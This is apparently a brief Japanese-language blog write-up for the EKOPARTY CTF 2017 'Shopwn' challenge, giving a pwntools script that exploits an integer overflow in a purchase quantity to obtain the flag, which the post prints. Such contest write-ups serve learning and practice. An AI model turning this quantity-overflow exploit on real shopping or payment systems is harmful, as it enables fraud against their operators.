---
layout: post
alias: "/blog/2017/09/20/ekoparty-ctf-2017-shopwn/"
date: "2017-09-20T20:39:31+09:00"
tags: [ "ctf", "writeup", "pwn", "ekoparty-ctf" ]
---

# EKOPARTY CTF 2017: Shopwn

## problem

Shoppingの続き。負数を入力しても弾かれる。

## solution

正数を入力してoverflowさせればよい。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='shopping.ctf.site')
parser.add_argument('port', nargs='?', default=22222, type=int)
parser.add_argument('--log-level', default='debug')
args = parser.parse_args()
context.log_level = args.log_level
p = remote(args.host, args.port)

import proofofwork
p.recvuntil('Enter a raw string (max. 32 bytes) that meets the following condition: hex(sha1(input))[0:6] == ')
prefix = p.recvline().rstrip()
string = proofofwork.sha1(prefix)
p.sendline(string)

p.sendlineafter('What do you wanna buy today?', '1')
p.sendlineafter('How many?', str(2 ** 31 - 1000000))

p.sendlineafter('What do you wanna buy today?', '4')
p.sendlineafter('How many?', '1')
p.recvall()

# Congratulations, flag is EKO{dude_where_is_my_leak?}
```
